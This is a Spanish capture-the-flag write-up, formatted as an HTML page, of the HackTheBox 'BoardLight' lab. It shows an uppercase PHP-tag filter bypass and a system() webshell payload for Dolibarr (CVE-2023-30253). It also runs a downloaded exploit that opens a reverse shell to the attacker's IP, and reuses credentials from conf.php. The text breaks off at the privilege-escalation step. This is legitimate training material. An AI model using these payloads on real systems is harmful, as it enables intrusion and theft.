@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BoardLight — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-cve { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label { font-family: var(--mo); font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3); }
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+.stat-value.red { color: var(--red); }
+.stat-value.orange { color: var(--orange); }
+.stat-value.blue { color: var(--blue); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; width: 260px; height: 260px; }
+.hero-orb canvas { display: block; width: 260px !important; height: 260px !important; }
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.lessons-grid,.flags-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;word-break:break-all;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.output-box .hl{color:var(--yellow);font-weight:700;}
+.output-box .hl-green{color:var(--green);font-weight:700;}
+.output-box .hl-red{color:var(--red);font-weight:700;}
+.output-box .hl-blue{color:var(--blue);font-weight:700;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.danger-box{background:rgba(248,113,113,.05);border-left:3px solid var(--red);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.danger-box strong{color:var(--red);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.danger-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.data-table .cve-id{color:var(--red);font-weight:700;font-family:var(--mo);}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+.flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+.flag-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem;position:relative;overflow:hidden;}
+.flag-card.user{border-left:3px solid var(--blue);}
+.flag-card.root{border-left:3px solid var(--green);}
+.flag-card .ftype{font-family:var(--bb);font-size:1rem;letter-spacing:2px;margin-bottom:.5rem;}
+.flag-card.user .ftype{color:var(--blue);}
+.flag-card.root .ftype{color:var(--green);}
+.flag-card .fval{font-family:var(--mo);font-size:.82rem;background:rgba(5,14,8,.9);padding:.5rem .75rem;border-radius:6px;border:1px solid var(--border);word-break:break-all;color:var(--text);}
+.flag-card .fpath{font-size:.72rem;color:var(--text3);margin-top:.4rem;font-family:var(--mo);}
+
+/* Attack chain */
+.attack-chain{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin:1.5rem 0;padding:1rem;background:rgba(5,14,8,.6);border:1px solid var(--border);border-radius:10px;}
+.chain-step{display:flex;flex-direction:column;align-items:center;padding:8px 12px;border-radius:6px;border:1px solid;font-family:var(--mo);font-size:10px;text-align:center;min-width:88px;}
+.chain-step.recon{color:var(--blue);border-color:rgba(96,165,250,.4);background:rgba(96,165,250,.06);}
+.chain-step.vuln{color:var(--red);border-color:rgba(248,113,113,.4);background:rgba(248,113,113,.06);}
+.chain-step.cred{color:var(--orange);border-color:rgba(251,146,60,.4);background:rgba(251,146,60,.06);}
+.chain-step.access{color:var(--yellow);border-color:rgba(251,191,36,.4);background:rgba(251,191,36,.06);}
+.chain-step.root{color:var(--green);border-color:rgba(0,232,122,.4);background:rgba(0,232,122,.06);}
+.chain-step .step-num{font-size:9px;opacity:.6;margin-bottom:2px;}
+.chain-step .step-name{font-weight:700;font-size:11px;}
+.chain-step .step-detail{font-size:9px;opacity:.7;margin-top:2px;}
+.chain-arrow{color:var(--text3);font-size:14px;}
+
+/* ASCII diagram */
+.ascii-diagram{font-family:var(--mo);font-size:.78rem;color:var(--text2);white-space:pre;line-height:1.6;padding:1rem;background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;overflow-x:auto;}
+.ascii-diagram .g{color:var(--green);}.ascii-diagram .b{color:var(--blue);}.ascii-diagram .o{color:var(--orange);}.ascii-diagram .r{color:var(--red);}.ascii-diagram .y{color:var(--yellow);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Easy</span>
+        <span class="tag tag-diff">Pwned</span>
+        <span class="tag tag-os">Linux</span>
+        <span class="tag tag-cve">CVE-2023-30253</span>
+        <span class="tag tag-cve">CVE-2022-37706</span>
+      </div>
+      <h1><span>BoardLight</span> — Dolibarr RCE + Enlightenment SUID</h1>
+      <p class="hero-sub">Cadena completa contra una instancia de <strong>Dolibarr ERP/CRM 17.0.0</strong> en un VHost descubierto vía fuzzing. Bypass del filtro PHP usando mayúsculas (<code>&lt;?pHp</code>) para RCE autenticado, extracción de credenciales en texto plano de <code>conf.php</code>, password reuse para SSH como <code>larissa</code> y escalada a root abusando del binario SUID <code>enlightenment_sys</code> (CVE-2022-37706).</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.129.23.6</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Ubuntu 20.04</span></div>
+        <div class="stat"><span class="stat-label">Vector</span><span class="stat-value red">PHP Injection</span></div>
+        <div class="stat"><span class="stat-label">PrivEsc</span><span class="stat-value green">SUID Exploit</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value blue">~50 min</span></div>
+      </div>
+    </div>
+    <div class="hero-orb">
+      <canvas id="heroOrb" width="520" height="520"></canvas>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- FLAGS -->
+<div class="flags-grid">
+  <div class="flag-card user">
+    <div class="ftype">▶ USER FLAG</div>
+    <div class="fval">cee91850d2ddeb29d21791f805ff79a0</div>
+    <div class="fpath">→ /home/larissa/user.txt · larissa@boardlight</div>
+  </div>
+  <div class="flag-card root">
+    <div class="ftype">▶ ROOT FLAG</div>
+    <div class="fval">f6dde27173550dca8eb9e40e154e4894</div>
+    <div class="fpath">→ /root/root.txt · root@boardlight</div>
+  </div>
+</div>
+
+<!-- ATTACK CHAIN -->
+<div class="attack-chain">
+  <div class="chain-step recon"><div class="step-num">01</div><div class="step-name">RECON</div><div class="step-detail">Nmap + VHost</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step vuln"><div class="step-num">02</div><div class="step-name">CVE-2023-30253</div><div class="step-detail">Dolibarr PHP RCE</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step access"><div class="step-num">03</div><div class="step-name">www-data</div><div class="step-detail">Reverse Shell</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step cred"><div class="step-num">04</div><div class="step-name">conf.php</div><div class="step-detail">DB Creds Leak</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step access"><div class="step-num">05</div><div class="step-name">larissa</div><div class="step-detail">SSH + User Flag</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step vuln"><div class="step-num">06</div><div class="step-name">CVE-2022-37706</div><div class="step-detail">Enlightenment SUID</div></div>
+  <div class="chain-arrow">→</div>
+  <div class="chain-step root"><div class="step-num">07</div><div class="step-name">ROOT</div><div class="step-detail">uid=0 Root Flag</div></div>
+</div>
+
+<div class="section">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p>BoardLight expone Apache 2.4.41 en el puerto 80 que sirve un VHost <code>board.htb</code> y un subdominio oculto <code>crm.board.htb</code> con <strong>Dolibarr 17.0.0</strong>. El acceso al panel se obtiene con credenciales por defecto <code>admin:admin</code>. Mediante <strong>CVE-2023-30253</strong> se inyecta código PHP usando <code>&lt;?pHp</code> (mayúsculas) para evadir el filtro y obtener una reverse shell como <code>www-data</code>. La contraseña <code>serverfun2$2023!!</code> almacenada en texto plano en <code>conf.php</code> es reutilizada para SSH como <code>larissa</code>. La escalada a root se logra explotando <strong>CVE-2022-37706</strong> en el binario SUID <code>enlightenment_sys</code>, que no sanitiza rutas con <code>/dev/..</code> al pasarlas a <code>mount</code>.</p>
+  </div>
+</div>
+
+<div class="section">
+  <h2>Información de la Máquina</h2>
+  <table class="data-table">
+    <tr><th>Campo</th><th>Valor</th></tr>
+    <tr><td>IP</td><td><code>10.129.23.6</code></td></tr>
+    <tr><td>OS</td><td>Ubuntu 20.04 LTS (Focal)</td></tr>
+    <tr><td>Servicios expuestos</td><td>SSH (22), HTTP (80)</td></tr>
+    <tr><td>Stack web</td><td>Apache 2.4.41 + PHP + MySQL</td></tr>
+    <tr><td>Aplicación</td><td>Dolibarr ERP/CRM 17.0.0</td></tr>
+    <tr><td>CVEs explotados</td><td>CVE-2023-30253, CVE-2022-37706</td></tr>
+  </table>
+</div>
+
+<div class="section">
+  <h2>Reconocimiento — Paso a Paso</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Reconocimiento</div>
+    <h3>Escaneo Nmap — Descubrimiento de puertos y servicios</h3>
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Nmap es el primer paso en cualquier pentesting. Con <code>-sC</code> ejecuta scripts básicos de enumeración y con <code>-sV</code> detecta versiones exactas de los servicios.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p22,80</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="flag-opt">-n</span> <span class="ip">10.129.23.6</span> <span class="flag-opt">-oN</span> <span class="param">phase2.txt</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p22,80</code> → escanear únicamente los puertos 22 y 80 (ya identificados en fase rápida)</div>
+        <div class="cmd-note"><code>-sC</code> → scripts NSE por defecto</div>
+        <div class="cmd-note"><code>-sV</code> → detección de versión del servicio</div>
+        <div class="cmd-note"><code>-oN</code> → guardar el output en formato normal</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+<pre>PORT   STATE SERVICE VERSION
+<span class="hl-blue">22</span>/tcp open  ssh     <span class="hl">OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</span>
+<span class="hl-blue">80</span>/tcp open  http    <span class="hl">Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Solo dos servicios expuestos: SSH (22) y Apache (80)</li>
+        <li>El servidor web no tiene título → posible landing page o requiere hostname específico (VHost)</li>
+        <li>OpenSSH actualizado → poco probable como vector inicial</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Explorar el servicio web. Buscar hostname en el footer y realizar fuzzing de subdominios para encontrar aplicaciones ocultas.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Reconocimiento</div>
+    <h3>Descubrimiento de Virtual Host — Subdomain Fuzzing</h3>
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Al visitar <code>http://10.129.23.6</code>, el footer muestra el hostname <code>board.htb</code>. Apache puede servir aplicaciones diferentes según el header <code>Host</code>, así que un subdominio oculto puede albergar la aplicación vulnerable.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">echo</span> <span class="str-c">"10.129.23.6 board.htb crm.board.htb"</span> | <span class="cmd">sudo tee -a</span> <span class="param">/etc/hosts</span></div>
+      <div class="cmd-line" style="margin-top:.75rem;"><span class="cmd">ffuf</span> <span class="flag-opt">-w</span> <span class="param">bitquark-subdomains-top100000.txt:FUZZ</span> <span class="flag-opt">-u</span> <span class="ip">http://board.htb/</span> <span class="flag-opt">-H</span> <span class="str-c">'Host: FUZZ.board.htb'</span> <span class="flag-opt">-fs</span> <span class="param">15949</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-w</code> → wordlist de subdominios (SecLists bitquark)</div>
+        <div class="cmd-note"><code>-H 'Host: FUZZ.board.htb'</code> → fuzzing del header Host (no de URL)</div>
+        <div class="cmd-note"><code>-fs 15949</code> → filtrar respuestas del tamaño de la página por defecto</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+<pre>[Status: 200, Size: 6360, Words: 397, Lines: 150]
+    * FUZZ: <span class="hl-green">crm</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Subdominio encontrado: <code>crm.board.htb</code></li>
+        <li>El filtro <code>-fs</code> elimina ruido y revela solo subdominios reales</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Acceder a <code>http://crm.board.htb</code> para identificar la aplicación y buscar vulnerabilidades.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h2>Explotación — CVE-2023-30253</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Acceso inicial</div>
+    <h3>Login en Dolibarr — Credenciales por defecto</h3>
+    <div class="why-box">
+      <strong>¿Por qué este intento?</strong>
+      <p>Al acceder a <code>crm.board.htb</code> encontramos un panel de login de <strong>Dolibarr 17.0.0</strong>. Las credenciales por defecto <code>admin:admin</code> son el primer intento estándar en cualquier panel administrativo.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Credenciales probadas en el panel</span></div>
+      <div class="cmd-line"><span class="param">URL:</span>  http://crm.board.htb/index.php</div>
+      <div class="cmd-line"><span class="param">User:</span> admin</div>
+      <div class="cmd-line"><span class="param">Pass:</span> admin</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Resultado</div>
+<pre><span class="hl-green">[+] Login exitoso como admin</span>
+Dolibarr 17.0.0 — Panel de administración accesible</pre>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Buscar CVEs para Dolibarr 17.0.0. <strong>CVE-2023-30253</strong> permite RCE autenticado mediante inyección PHP con bypass de filtro en mayúsculas.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Explotación RCE</div>
+    <h3>CVE-2023-30253 — PHP Code Injection vía módulo Websites</h3>
+    <div class="why-box">
+      <strong>¿Por qué funciona?</strong>
+      <p>Dolibarr ≤ 17.0.0 permite a usuarios autenticados inyectar PHP en páginas del módulo <em>Websites</em>. El filtro de seguridad bloquea <code>&lt;?php</code> en minúsculas pero NO verifica variantes en mayúsculas. PHP acepta ambas formas, lo que permite el bypass.</p>
+    </div>
+    <div class="danger-box">
+      <strong>Detalle técnico del bypass</strong>
+      <p>Filtro: <code>if (strpos($content, '&lt;?php') !== false) { error(); }</code><br>
+      Payload: <code>&lt;?pHp echo system($_GET["cmd"]); ?&gt;</code><br>
+      PHP interpreta ambas variantes igual. El filtro en minúsculas no captura <code>&lt;?pHp</code>.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Descargar exploit público</span></div>
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="ip">https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/main/exploit.py</span> <span class="flag-opt">-o</span> <span class="param">exploit.py</span></div>
+      <div class="cmd-line" style="margin-top:.75rem;"><span class="cmd">nc</span> <span class="flag-opt">-lvnp</span> <span class="param">4444</span> &amp;</div>
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="param">exploit.py</span> <span class="ip">http://crm.board.htb</span> <span class="user-c">admin admin</span> <span class="ip">10.10.14.154</span> <span class="param">4444</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output del exploit</div>
+<pre><span class="hl-green">[*] Trying authentication...</span>
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell...
+
+<span class="hl-green">connect to [10.10.14.154] from (UNKNOWN) [10.129.23.6] 33430</span>
+<span class="hl">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué hace el exploit paso a paso?</strong>
+      <ol>
+        <li>Crea un website en Dolibarr (acción <code>addcontainer</code>)</li>
+        <li>Crea una página usando <code>radiocreatefrom=checkboxcreatemanually</code> con multipart/form-data</li>
+        <li>Inyecta el payload de reverse shell con <code>&lt;?pHp</code> mediante <code>updatesource</code></li>
+        <li>Trigger: <code>/public/website/index.php?website=X&amp;pageref=X</code></li>
+        <li>Shell recibida como <code>www-data</code></li>
+      </ol>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Buscar credenciales en el archivo de configuración <code>conf/conf.php</code> de Dolibarr.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 5 — Post-explotación</div>
+    <h3>Extracción de credenciales — conf.php</h3>
+    <div class="why-box">
+      <strong>¿Por qué leer conf.php?</strong>
+      <p>Dolibarr guarda la contraseña de la base de datos <strong>en texto plano</strong> en <code>htdocs/conf/conf.php</code>. Los administradores frecuentemente reutilizan la misma contraseña entre la BD y las cuentas del sistema operativo.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="user-c">www-data@boardlight$</span> <span class="cmd">cat</span> <span class="param">/var/www/html/crm.board.htb/htdocs/conf/conf.php</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Credenciales encontradas</div>
+<pre>$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_user='<span class="hl">dolibarrowner</span>';
+$dolibarr_main_db_pass='<span class="hl-green">serverfun2$2023!!</span>';
+$dolibarr_main_db_name='dolibarr';</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Contraseña MySQL: <code>serverfun2$2023!!</code></li>
+        <li>Usuario del sistema en <code>/etc/passwd</code>: <code>larissa</code> (uid=1000)</li>
+        <li>Hipótesis: el admin reutilizó la contraseña entre MySQL y SSH</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Intentar SSH con <code>larissa:serverfun2$2023!!</code>.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 6 — Movimiento lateral</div>
+    <h3>Acceso SSH — Password Reuse → User Flag</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">sshpass</span> <span class="flag-opt">-p</span> <span class="str-c">'serverfun2$2023!!'</span> <span class="cmd">ssh</span> <span class="user-c">larissa@10.129.23.6</span> <span class="str-c">"id; cat ~/user.txt"</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>sshpass</code> → permite pasar la contraseña por CLI sin prompt interactivo</div>
+        <div class="cmd-note">Ejecutar <code>id</code> + <code>cat user.txt</code> en una sola conexión para verificar acceso y leer la flag</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+<pre>uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
+<span class="hl">cee91850d2ddeb29d21791f805ff79a0</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>¡User flag capturada! Password reuse confirmado</li>
+        <li>larissa pertenece al grupo <code>adm</code> → puede leer logs del sistema, útil para más enumeración</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h2>Escalada de Privilegios — CVE-2022-37706</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 7 — Enumeración SUID</div>
+    <h3>Búsqueda de binarios SUID — Enlightenment</h3>
+    <div class="why-box">
+      <strong>¿Por qué SUID?</strong>
